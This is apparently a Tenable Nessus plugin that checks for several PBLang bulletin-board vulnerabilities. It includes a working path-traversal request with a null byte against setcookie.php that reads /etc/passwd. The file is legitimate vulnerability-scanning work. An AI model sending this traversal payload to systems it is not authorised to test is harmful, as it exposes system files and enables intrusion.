#
# (C) Tenable Network Security
#


if (description) {
  script_id(19594);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2892", "CVE-2005-2893", "CVE-2005-2894", "CVE-2005-2895");
  script_bugtraq_id(14765, 14766);

  name["english"] = "PBLang Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple flaws. 

Description :

The remote host is running PBLang, a bulletin board system that uses
flat files and is written in PHP. 

The version of PBLang installed on the remote suffers from several
vulnerabilities, including remote code execution, information
disclosure, cross-site scripting, and path disclosure. 

See also : 

http://retrogod.altervista.org/pblang465.html
http://archives.neohapsis.com/archives/bugtraq/2005-09/0078.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in PBLang";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in setcookie.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/setcookie.php?",
      "u=../../../../../../../../../../../../etc/passwd%00&",
      "plugin=", SCRIPT_NAME
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
    security_warning(port);
    exit(0);
  }
}
